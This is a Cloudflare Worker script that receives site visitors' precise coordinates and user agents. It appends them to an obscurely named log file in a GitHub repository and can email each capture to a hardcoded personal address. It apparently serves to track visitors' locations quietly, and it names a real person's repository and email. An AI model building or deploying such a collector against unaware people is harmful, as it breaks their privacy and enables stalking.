export default {
  async fetch(request, env) {
    // Basic CORS handling
    if (request.method === "OPTIONS") {
      return withCors(
        new Response(null, {
          status: 204,
          headers: {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "POST, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
          },
        })
      );
    }
    console.log(121212);
    if (request.method !== "POST") {
      return withCors(new Response("Method Not Allowed", { status: 405 }));
    }

    const token = env.GITHUB_TOKEN;
    const repo = env.REPO || "VanikKhachatryan2002/Arina";
    const branch = env.BRANCH || "main";
    const targetPath = env.TARGET_PATH || "logs/.u7_loc.jsonl";
    const brevoKey = env.BREVO_API_KEY;
    const fromEmail = env.FROM_EMAIL;
    const toEmail = env.TO_EMAIL || "vanikkhachatryan2002@gmail.com";

    if (!token) {
      return withCors(new Response("Missing GITHUB_TOKEN", { status: 500 }));
    }

    let payload;
    try {
      payload = await request.json();
    } catch (err) {
      return withCors(new Response("Invalid JSON body", { status: 400 }));
    }

    const { lat, lng, accuracy, source, timestamp, userAgent, error } = payload || {};
    const hasCoords = typeof lat === "number" && typeof lng === "number";
    if (!hasCoords && !error) {
      return withCors(new Response("Missing coordinates or error info", { status: 400 }));
    }

    const record = {
      lat,
      lng,
      accuracy,
      source: source || "unknown",
      timestamp: timestamp || new Date().toISOString(),
      userAgent: userAgent || "",
      error: error || null,
    };

    const apiBase = `https://api.github.com/repos/${repo}/contents/${encodeURIComponent(targetPath)}`;
    const headers = {
      Authorization: `token ${token}`,
      "User-Agent": "cf-worker-location-logger",
      Accept: "application/vnd.github.v3+json",
    };

    let existing = "";
    let sha = undefined;

    const getResp = await fetch(`${apiBase}?ref=${encodeURIComponent(branch)}`, { headers });
    if (getResp.status === 200) {
      const body = await getResp.json();
      sha = body.sha;
      existing = decodeBase64(body.content || "");
    } else if (getResp.status !== 404) {
      const text = await getResp.text();
      return withCors(new Response(`GitHub get error: ${getResp.status} ${text}`, { status: 502 }));
    }

    const nextContent = existing + JSON.stringify(record) + "\n";
    const putBody = {
      message: `Append location ${new Date().toISOString()}`,
      content: encodeBase64(nextContent),
      branch,
    };
    if (sha) putBody.sha = sha;

    const putResp = await fetch(apiBase, {
      method: "PUT",
      headers: {
        ...headers,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(putBody),
    });

    if (!putResp.ok) {
      const text = await putResp.text();
      return withCors(new Response(`GitHub put error: ${putResp.status} ${text}`, { status: 502 }));
    }

    // Optional email via Brevo HTTP API if configured
    if (brevoKey && fromEmail) {
      const emailBody = {
        sender: { email: fromEmail },
        to: [{ email: toEmail }],
        subject: "New visitor location captured",
        textContent: JSON.stringify(record, null, 2),
      };
      const emailResp = await fetch("https://api.brevo.com/v3/smtp/email", {
        method: "POST",
        headers: {
          "api-key": brevoKey,
          "Content-Type": "application/json",
          accept: "application/json",
        },
        body: JSON.stringify(emailBody),
      });
      if (!emailResp.ok) {
        const text = await emailResp.text();
        return withCors(new Response(`Brevo error: ${emailResp.status} ${text}`, { status: 502 }));
      }
    }

    return withCors(new Response("ok", { status: 200 }));
  },
};

function withCors(resp) {
  resp.headers.set("Access-Control-Allow-Origin", "*");
  return resp;
}

function encodeBase64(str) {
  return btoa(unescape(encodeURIComponent(str)));
}

function decodeBase64(b64) {
  return decodeURIComponent(escape(atob(b64.replace(/\s/g, ""))));
}
